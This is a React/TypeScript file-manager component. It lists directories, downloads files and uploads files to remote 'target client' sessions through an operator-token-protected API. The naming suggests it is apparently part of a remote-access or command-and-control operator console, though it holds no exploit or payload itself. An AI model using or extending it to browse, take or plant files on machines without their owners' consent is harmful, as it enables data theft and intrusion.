import React, { useEffect, useState } from 'react';
import {
  Box,
  Paper,
  Typography,
  Button,
  TextField,
  FormControl,
  InputLabel,
  Select,
  MenuItem,
  Grid,
  List,
  ListItem,
  ListItemIcon,
  ListItemText,
  IconButton,
  CircularProgress,
} from '@mui/material';
import { Folder as FolderIcon, InsertDriveFile as FileIcon, Refresh as RefreshIcon, Upload as UploadIcon } from '@mui/icons-material';

const API_BASE = process.env.REACT_APP_API_URL || '';
const OP_TOKEN = process.env.REACT_APP_OP_TOKEN || '';

type Session = { id: string; addr: string };
type DirEntry = { name: string; dir: boolean; size: number };

const FileManager: React.FC = () => {
  const [sessions, setSessions] = useState<Session[]>([]);
  const [selectedId, setSelectedId] = useState('');
  const [path, setPath] = useState('.');
  const [entries, setEntries] = useState<DirEntry[]>([]);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [uploadPath, setUploadPath] = useState('');

  useEffect(() => {
    if (!API_BASE) return;
    const headers: HeadersInit = {};
    if (OP_TOKEN) headers['X-Op-Token'] = OP_TOKEN;
    fetch(`${API_BASE}/op/sessions`, { headers })
      .then((res) => (res.ok ? res.json() : []))
      .then((data) => setSessions(Array.isArray(data) ? data : []))
      .catch(() => setSessions([]));
  }, []);

  const listDir = async () => {
    if (!selectedId || !API_BASE) return;
    setLoading(true);
    setError(null);
    try {
      const headers: HeadersInit = { 'Content-Type': 'application/json' };
      if (OP_TOKEN) headers['X-Op-Token'] = OP_TOKEN;
      const res = await fetch(`${API_BASE}/op/listdir`, {
        method: 'POST',
        headers,
        body: JSON.stringify({ session_id: selectedId, path }),
      });
      const data = await res.json().catch(() => ({}));
      if (!res.ok) {
        setError(data.error || res.statusText);
        setEntries([]);
        return;
      }
      if (data.status === 'error') {
        setError(data.error || 'List failed');
        setEntries([]);
        return;
      }
      try {
        const list = JSON.parse(data.output || '[]');
        setEntries(Array.isArray(list) ? list : []);
      } catch {
        setEntries([]);
        setError('Invalid listing');
      }
    } catch (e) {
      setError(String(e));
      setEntries([]);
    } finally {
      setLoading(false);
    }
  };

  const downloadFile = async (remotePath: string) => {
    if (!selectedId || !API_BASE) return;
    setLoading(true);
    setError(null);
    try {
      const headers: HeadersInit = { 'Content-Type': 'application/json' };
      if (OP_TOKEN) headers['X-Op-Token'] = OP_TOKEN;
      const res = await fetch(`${API_BASE}/op/download`, {
        method: 'POST',
        headers,
        body: JSON.stringify({ session_id: selectedId, path: remotePath }),
      });
      const data = await res.json().catch(() => ({}));
      if (!res.ok || data.status === 'error') {
        setError(data.error || 'Download failed');
        return;
      }
      const bin = atob(data.output || '');
      const bytes = new Uint8Array(bin.length);
      for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
      const blob = new Blob([bytes]);
      const a = document.createElement('a');
      a.href = URL.createObjectURL(blob);
      a.download = remotePath.split(/[/\\]/).pop() || 'download';
      a.click();
      URL.revokeObjectURL(a.href);
    } catch (e) {
      setError(String(e));
    } finally {
      setLoading(false);
    }
  };

  const uploadFile = async (file: File) => {
    if (!selectedId || !API_BASE || !uploadPath.trim()) return;
    setLoading(true);
    setError(null);
    try {
      const reader = new FileReader();
      reader.onload = async () => {
        const b64 = (reader.result as string).split(',')[1] || (reader.result as string);
        const headers: HeadersInit = { 'Content-Type': 'application/json' };
        if (OP_TOKEN) headers['X-Op-Token'] = OP_TOKEN;
        const res = await fetch(`${API_BASE}/op/upload`, {
          method: 'POST',
          headers,
          body: JSON.stringify({
            session_id: selectedId,
            path: uploadPath.trim(),
            content: b64,
          }),
        });
        const data = await res.json().catch(() => ({}));
        if (!res.ok || data.status === 'error') {
          setError(data.error || 'Upload failed');
        }
        setLoading(false);
      };
      reader.readAsDataURL(file);
    } catch (e) {
      setError(String(e));
      setLoading(false);
    }
  };

  const noApi = !API_BASE;

  return (
    <Box>
      <Typography variant="h4" gutterBottom>
        File Manager
      </Typography>
      {noApi && (
        <Typography color="textSecondary">
          Set REACT_APP_API_URL to server base (e.g. https://localhost:8443)
        </Typography>
      )}
      {!noApi && (
        <Grid container spacing={2}>
          <Grid item xs={12} md={6}>
            <FormControl fullWidth size="small">
              <InputLabel>Target Client</InputLabel>
              <Select
                label="Target Client"
                value={selectedId}
                onChange={(e) => setSelectedId(e.target.value)}
              >
                <MenuItem value="">Select session</MenuItem>
                {sessions.map((s) => (
                  <MenuItem key={s.id} value={s.id}>{s.id} ({s.addr})</MenuItem>
                ))}
              </Select>
            </FormControl>
          </Grid>
          <Grid item xs={12} md={6}>
            <Box display="flex" gap={1} alignItems="center">
              <TextField
                size="small"
                fullWidth
                label="Path"
                value={path}
                onChange={(e) => setPath(e.target.value)}
                placeholder=". or C:\path"
              />
              <IconButton onClick={listDir} disabled={!selectedId || loading} title="List directory">
                <RefreshIcon />
              </IconButton>
            </Box>
          </Grid>
          {error && (
            <Grid item xs={12}>
              <Typography color="error">{error}</Typography>
            </Grid>
          )}
          <Grid item xs={12}>
            <Paper sx={{ p: 2, minHeight: 200 }}>
              {loading && <Box display="flex" alignItems="center" gap={1}><CircularProgress size={20} /> Loading...</Box>}
              {!loading && entries.length === 0 && selectedId && (
                <Typography color="textSecondary">Click refresh to list directory</Typography>
              )}
              {!loading && entries.length > 0 && (
                <List dense>
                  <ListItem button onClick={() => setPath(path === '.' || path === '' ? '..' : path.replace(/[/\\][^/\\]+$/, '') || '.')}>
                    <ListItemIcon><FolderIcon /></ListItemIcon>
                    <ListItemText primary=".." />
                  </ListItem>
                  {entries.map((e) => (
                    <ListItem
                      key={e.name}
                      button
                      onClick={() => {
                        if (e.dir) setPath(path.replace(/\/?$/, '/') + e.name);
                        else downloadFile(path.replace(/\/?$/, '/') + e.name);
                      }}
                    >
                      <ListItemIcon>{e.dir ? <FolderIcon /> : <FileIcon />}</ListItemIcon>
                      <ListItemText primary={e.name} secondary={e.dir ? '' : `${e.size} bytes`} />
                    </ListItem>
                  ))}
                </List>
              )}
            </Paper>
          </Grid>
          <Grid item xs={12}>
            <Typography variant="subtitle2" gutterBottom>Upload file</Typography>
            <Box display="flex" gap={1} alignItems="center" flexWrap="wrap">
              <TextField
                size="small"
                label="Remote path"
                value={uploadPath}
                onChange={(e) => setUploadPath(e.target.value)}
                placeholder="C:\path\to\file"
                sx={{ minWidth: 200 }}
              />
              <Button
                variant="outlined"
                component="label"
                startIcon={<UploadIcon />}
                disabled={!selectedId || loading}
              >
                Choose file
                <input
                  type="file"
                  hidden
                  onChange={(e) => {
                    const f = e.target.files?.[0];
                    if (f) uploadFile(f);
                    e.target.value = '';
                  }}
                />
              </Button>
            </Box>
          </Grid>
        </Grid>
      )}
    </Box>
  );
};

export default FileManager;
